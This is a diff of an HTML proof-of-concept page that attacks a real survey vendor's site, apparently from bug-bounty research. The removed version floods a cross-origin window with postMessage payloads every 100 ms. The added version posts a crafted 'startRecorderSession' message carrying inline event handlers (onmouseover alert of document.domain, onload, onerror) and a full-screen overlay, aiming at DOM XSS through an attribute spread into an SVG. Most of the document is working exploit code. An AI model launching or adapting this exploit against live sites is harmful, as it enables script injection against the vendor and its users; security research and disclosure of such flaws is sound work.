@@ -2,73 +2,66 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PostMessage Cross-Origin Flood Test</title>
+    <title>PostMessage Attribute Spread Injection PoC</title>
     <style>
         body { font-family: sans-serif; padding: 40px; text-align: center; }
-        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #e65100; color: white; border: none; border-radius: 5px; font-weight: bold; }
-        button:hover { background: #b53d00; }
-        #status { margin-top: 20px; color: #333; font-family: monospace; font-size: 14px; background: #ffe0b2; padding: 10px; display: inline-block; border-radius: 4px; }
+        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #202124; color: white; border: none; border-radius: 5px; font-weight: bold; }
+        button:hover { background: #000000; }
+        #status { margin-top: 20px; color: #1a73e8; font-family: monospace; font-size: 14px; background: #e8f0fe; padding: 10px; display: inline-block; border-radius: 4px; }
     </style>
 </head>
 <body>
 
-    <h2>Target Cross-Origin Message Flooding Test</h2>
-    <p>This test broadcasts state-modification payloads every 0.1 seconds to test race conditions.</p>
+    <h2>Target Attribute Spread (`...t`) Injection Test</h2>
+    <p>This payload attempts to inject raw DOM event handlers directly into the element properties.</p>
     
-    <button id="startFlood">Launch & Initiate Flood</button>
+    <button id="executeTest">Launch & Inject Attributes</button>
     <br><br>
-    <div id="status">Status: Waiting for user action...</div>
+    <div id="status">Status: Standby...</div>
 
     <script>
-        document.getElementById('startFlood').addEventListener('click', () => {
-            const targetUrl = "https://capitalcom.qualtrics.com/login";
-            document.getElementById('status').innerText = "Status: Spawning target window...";
+        document.getElementById('executeTest').addEventListener('click', () => {
+            const targetUrl = "https://qualtrics.com";
+            document.getElementById('status').innerText = "Status: Spawning target layout window...";
 
-            // 1. Open the target application tab
             const victimWindow = window.open(targetUrl, "_blank");
 
             if (!victimWindow) {
-                document.getElementById('status').innerText = "Status: Error - Popup blocker active.";
+                document.getElementById('status').innerText = "Status: Popup blocker blocked execution.";
                 return;
             }
 
-            document.getElementById('status').innerText = "Status: Window opened. Waiting 6 seconds for initial SDK setup...";
+            document.getElementById('status').innerText = "Status: Tab active. Initializing 6-second delay loop...";
 
-            // 2. Initial buffer delay to let the targeted JS bundles finish compiling
             setTimeout(() => {
-                document.getElementById('status').innerText = "Status: FLOOD ACTIVE. Transmitting payloads every 100ms...";
+                document.getElementById('status').innerText = "Status: Injecting weaponized attribute payload...";
 
-                // 3. Set up an interval loop to fire every 100 milliseconds (0.1s)
-                let messageCount = 0;
-                const floodInterval = setInterval(() => {
-                    // Check if the window was closed by the user to stop the loop
-                    if (victimWindow.closed) {
-                        clearInterval(floodInterval);
-                        document.getElementById('status').innerText = "Status: Target window closed. Flood stopped.";
-                        return;
+                // This structure maps malicious DOM event handlers directly onto the object 't'
+                // that gets passed to the spread handler (...t) inside G.createElement("svg", {...t})
+                const payload = {
+                    action: "startRecorderSession",
+                    experience: {
+                        id: "poc_spread_exploit",
+                        locale: "en-US",
+                        theme: {
+                            id: "malicious_attributes",
+                            name: "Attribute Test",
+                            styles: {}
+                        },
+                        // We target the raw properties passed down to the SVG wrapper object 't'
+                        // Modern browsers execute inline JavaScript inside an SVG if an event fires
+                        onmouseover: "alert('DOM XSS via Spread: ' + document.domain)",
+                        onload: "console.warn('SVG Element Spreading Exploited Successfully!')",
+                        onerror: "alert('Error execution path hit')",
+                        style: "width:100vw; height:100vh; position:fixed; top:0; left:0; z-index:999999; cursor:pointer;"
                     }
+                };
 
-                    const payload = {
-                        action: "startRecorderSession",
-                        experience: {
-                            id: "poc_flood_" + messageCount,
-                            locale: "en-US",
-                            theme: {
-                                id: "flooded_theme_override",
-                                name: "Flooded State Loop " + messageCount,
-                                styles: {}
-                            }
-                        }
-                    };
+                // Dispatch cross-origin
+                victimWindow.postMessage(payload, "*");
 
-                    // 4. Fire the message across the boundary
-                    victimWindow.postMessage(payload, "*");
-                    
-                    messageCount++;
-                    document.getElementById('status').innerText = `Status: FLOOD ACTIVE. Messages sent: ${messageCount}`;
-                }, 100); // 100ms = 0.1 seconds
-
-            }, 6000); 
+                document.getElementById('status').innerText = "Status: Injection finished. Hover mouse over the target window to trigger execution.";
+            }, 6000);
         });
     </script>
 
